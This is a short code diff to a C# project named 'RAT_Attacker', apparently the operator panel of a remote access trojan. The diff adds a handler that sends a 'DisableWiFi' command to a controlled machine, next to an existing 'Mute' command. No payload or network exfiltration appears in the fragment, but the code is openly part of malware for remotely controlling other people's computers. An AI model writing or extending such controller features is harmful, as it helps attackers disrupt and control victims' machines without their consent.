@@ -1,5 +1,6 @@
 ﻿using RAT_Library;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -98,6 +99,11 @@ namespace RAT_Attacker
         private void Mute(object sender, RoutedEventArgs e)
         {
             SendCommand(RatCommand.Mute);
+        }
+
+        private void DisableWiFi(object sender, RoutedEventArgs e)
+        {
+            SendCommand(RatCommand.DisableWiFi);
         }
     }
 }
